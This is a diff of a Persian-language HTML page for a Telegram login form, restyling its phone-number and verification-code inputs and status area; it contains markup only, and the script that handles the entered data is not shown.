@@ -1,22 +1,29 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="fa" dir="rtl">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ورود تلگرام</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
     <h1>ورود به تلگرام</h1>
-    <input id="phone" placeholder="شماره تلفن" />
-    <button id="sendPhone">ارسال شماره</button>
-
-    <div id="codeSection" style="display:none;">
-      <input id="code" placeholder="کد تایید" />
-      <button id="sendCode">تایید کد</button>
+    <p>لطفاً شماره تلفن خود را وارد کنید</p>
+    
+    <div class="input-group">
+      <input id="phone" type="tel" placeholder="شماره تلفن (مثال: +989123456789)" />
+      <button id="sendPhone">ارسال شماره</button>
     </div>
 
-    <pre id="status"></pre>
+    <div id="codeSection" class="hidden">
+      <div class="input-group">
+        <input id="code" type="text" placeholder="کد تایید ۵ رقمی" />
+        <button id="sendCode">تایید کد</button>
+      </div>
+    </div>
+
+    <div id="status" class="status"></div>
   </div>
   <script src="script.js"></script>
 </body>
